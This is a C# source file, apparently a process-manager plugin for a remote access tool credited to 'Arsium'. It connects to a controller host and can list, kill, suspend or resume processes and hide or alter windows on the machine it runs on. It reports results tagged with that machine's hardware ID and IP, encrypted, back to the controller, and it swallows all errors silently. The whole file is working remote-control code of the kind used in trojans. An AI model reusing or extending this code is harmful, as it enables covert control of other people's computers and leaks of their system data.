using Shared;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try 
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                    switch (T)
                    {

                        case PacketTypes.PacketType.GET_PROC:
                            await Task.Run(() => Functions.GetProcesses(ref D));
                            D.HWID = HWID;
                            D.Type = Shared.PacketTypes.PacketType.GET_PROC;
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;

                        case PacketTypes.PacketType.KILL_PROC:
                            bool killed = await Task.Run(() => Functions.KillProcess(int.Parse(Param[1].ToString())));
                            D.HWID = HWID;
                            D.Type = Shared.PacketTypes.PacketType.KILL_PROC;
                            D.DataReturn = new object[] { killed, Param[1].ToString() };
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;

                        case PacketTypes.PacketType.RESUME_PROC:
                            bool resumed = await Task.Run(() => Functions.ResumeProcess(int.Parse(Param[1].ToString())));
                            D.HWID = HWID;
                            D.Type = Shared.PacketTypes.PacketType.RESUME_PROC;
                            D.DataReturn = new object[] { resumed, Param[1].ToString() };
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;

                        case PacketTypes.PacketType.SUSPEND_PROC:
                            bool suspended = await Task.Run(() => Functions.SuspendProcess(int.Parse(Param[1].ToString())));
                            D.HWID = HWID;
                            D.Type = Shared.PacketTypes.PacketType.SUSPEND_PROC;
                            D.DataReturn = new object[] { suspended, Param[1].ToString() };
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;

                        case PacketTypes.PacketType.SET_WND_TEXT:
                            bool settext = await Task.Run(() => Functions.SetWindowsText(int.Parse(Param[1].ToString()), Param[2].ToString()));
                            D.HWID = HWID;
                            D.Type = Shared.PacketTypes.PacketType.SET_WND_TEXT;
                            D.DataReturn = new object[] { settext, Param[1].ToString(), Param[2].ToString() };
                            D.IP_Origin = BaseIP;
                            await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                            break;

                        case PacketTypes.PacketType.MAXIMIZE_WND:
                            await Task.Run(() => Functions.MaximizeWindow(int.Parse(Param[1].ToString())));
                            break;

                        case PacketTypes.PacketType.MINIMZE_WND:
                            await Task.Run(() => Functions.MinimizeWindow(int.Parse(Param[1].ToString())));
                            break;

                        case PacketTypes.PacketType.HIDE_WND:
                            await Task.Run(() => Functions.HideWindow((IntPtr)Param[1]));
                            break;

                        case PacketTypes.PacketType.SHOW_WND:
                            await Task.Run(() => Functions.ShowWindow((IntPtr)Param[1]));
                            break;

                }
                    S.Close();
                    S.Dispose();
            }
            catch (Exception)
            {
            }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
